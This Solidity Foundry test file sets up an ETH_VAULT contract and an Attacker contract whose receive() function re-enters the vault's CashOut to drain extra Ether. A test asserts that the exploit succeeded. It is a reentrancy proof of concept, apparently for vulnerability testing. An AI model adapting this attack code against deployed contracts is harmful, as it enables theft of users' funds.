
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ETH_VAULT, Log} from "../src/ETH_VAULT.sol";

contract TestReentrancyETH_VAULT is Test {

    ETH_VAULT public vault;
    Attacker public _attacker;

    function setUp() public {
        Log transferLog = new Log();
        vault = new ETH_VAULT(address(transferLog));
        _attacker = new Attacker(address(vault));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        vm.assume(attackVal > 1 ether);
        vm.assume(attackVal <= type(uint128).max);
        
        vm.deal(address(vault), attackVal * 2); 
        
        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    ETH_VAULT public vault;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 storedVal;

    constructor(address victimAddress) { 
        vault = ETH_VAULT(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        
        vault.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        storedVal = val;
        initialSnapshot = address(this).balance;

        vault.CashOut(val);

        if (address(this).balance == initialSnapshot + val * 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 1) {            
            attackCallCount++;
            vault.CashOut(storedVal);
            revert("Reentrancy exploit - force fail the outer call");
        }
    }
}
